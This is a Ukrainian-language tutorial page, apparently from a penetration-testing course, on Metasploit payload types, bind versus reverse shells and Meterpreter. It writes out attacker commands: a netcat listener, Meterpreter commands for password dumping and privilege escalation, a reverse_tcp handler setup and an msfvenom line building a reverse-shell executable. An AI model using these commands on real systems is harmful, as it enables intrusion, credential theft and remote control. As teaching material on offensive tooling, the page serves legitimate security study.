Типи пейлоадів

Пейлоад (Payload) — це код, що виконується на цільовій системі після успішної експлуатації вразливості. Визначає, що саме відбудеться після зламу.

Singles (Inline)

Автономні пейлоади

  • Усе в одному пакеті
  • Більший розмір
  • Не потребують другого з'єднання
  • Простіші, але менш гнучкі
windows/shell_reverse_tcp

Використовують _ (підкреслення) у назві

Stagers

Завантажувачі стадій

  • Дуже малий розмір (100-300 байт)
  • Встановлює канал зв'язку
  • Завантажує другу стадію
  • Обходить обмеження розміру
windows/meterpreter/reverse_tcp

Використовують / (слеш) між стадіями

Stages

Повнофункціональні стадії

  • Завантажуються стейджером
  • Більший розмір, більше функцій
  • Meterpreter, VNC, shell
  • Модульна архітектура
meterpreter
vncinject
shell

Завантажуються після встановлення з'єднання

Синтаксис: Singles: os/payload_name | Staged: os/stage/stager

Bind Shell vs Reverse Shell

Bind Shell

Ціль відкриває порт

Атакувач
↓ підключається
Ціль (слухає порт 4444)
  • Ціль відкриває порт і чекає
  • Атакувач підключається ДО цілі
  • Блокується фаєрволами
  • Проблеми з NAT
# MSF payload
windows/shell/bind_tcp
linux/x64/shell_bind_tcp

# Підключення (атакувач)
nc target_ip 4444

Reverse Shell

Ціль підключається назад

Атакувач (слухає порт 4444)
↑ підключається назад
Ціль
  • Атакувач відкриває порт і чекає
  • Ціль підключається НАЗАД до атакувача
  • Обходить більшість фаєрволів
  • Працює через NAT
# MSF payload
windows/shell/reverse_tcp
linux/x64/shell_reverse_tcp

# Прослуховування (атакувач)
nc -lvnp 4444
Практична порада: Reverse shell — стандартний вибір у 95% випадків. Обходить вихідні фаєрволи, працює через NAT, менш помітний для систем виявлення вторгнень.

Meterpreter — просунутий пейлоад

Meterpreter (Meta-Interpreter) — найпотужніший пейлоад Metasploit. Працює повністю в оперативній пам'яті (in-memory), не створює файлів на диску, динамічно розширюється модулями.

Основні можливості

  • Завантаження/вивантаження файлів
  • Скріншоти та доступ до вебкамери
  • Кейлоггер (перехоплення клавіш)
  • Міграція між процесами
  • Дамп паролів (hashdump)
  • Проброс портів (port forwarding)
  • Pivoting (використання як проксі)
  • Обхід антивірусів (in-memory)
# Ключові команди Meterpreter
sysinfo # Інфо про систему
getuid # Поточний користувач
getsystem # Підвищення до SYSTEM
hashdump # Дамп паролів
upload file.exe # Завантажити файл
download secret.txt # Скачати файл
shell # Запустити cmd/bash
migrate 1234 # Перейти в інший процес
run post/windows/gather/enum_shares

Варіанти Meterpreter

Пейлоад ОС/Середовище Застосування
windows/meterpreter Windows (x86/x64) Найпопулярніший, повний функціонал
linux/x64/meterpreter Linux (x64) Серверні системи, контейнери
php/meterpreter PHP Веб-додатки, CMS (WordPress, Joomla)
java/meterpreter Java (JVM) Веб-сервери (Tomcat, JBoss)
python/meterpreter Python Системи з Python (Linux, macOS)
android/meterpreter Android Мобільні пристрої
Переваги: Шифрований канал, модульність, скриптування (AutoRunScript), стабільність.

PHP, Java, Python

Додаткові транспорти: reverse_tcp (швидкий), reverse_http (обхід фаєрволів), reverse_https (шифрування + обхід інспекції), bind_tcp (якщо reverse неможливий)
# Приклад налаштування пейлоаду в MSFconsole
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

# Альтернативно — використовуючи msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe
